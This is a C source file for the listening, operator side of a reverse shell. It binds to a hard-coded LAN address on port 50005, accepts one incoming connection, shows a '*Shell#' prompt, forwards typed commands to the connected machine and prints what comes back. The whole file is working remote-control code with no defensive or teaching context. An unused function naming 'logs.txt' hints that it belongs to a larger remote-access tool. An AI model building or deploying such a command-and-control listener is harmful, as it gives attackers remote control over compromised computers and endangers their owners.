#include <stdio.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 50005
char fileName[] = "logs.txt";

char* getFileName(){
    printf("%s\n", fileName);
    return fileName;
    
}

int main()
{
    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;
    socklen_t client_len;

    sock = socket(AF_INET, SOCK_STREAM, 0);
    printf("Socket created...\n");

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("Error setting TCP socket options\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr("192.168.0.144");
    server_address.sin_port = htons(PORT);

    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));

    listen(sock, 5);
    printf("Listening...\n");

    client_len = sizeof(client_address);

    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_len);
    printf("Connected on with %s\n:", inet_ntoa(client_address.sin_addr));

    while (1)
    {
    jump:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));
        printf("*Shell#%s~$: ", inet_ntoa(client_address.sin_addr));
        fgets(buffer, sizeof(buffer), stdin);
        strtok(buffer, "\n");
        //write is same as send
        write(client_socket, buffer, sizeof(buffer));
        if (strncmp("q", buffer, 1) == 0)
        {
            break;
        }
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }
}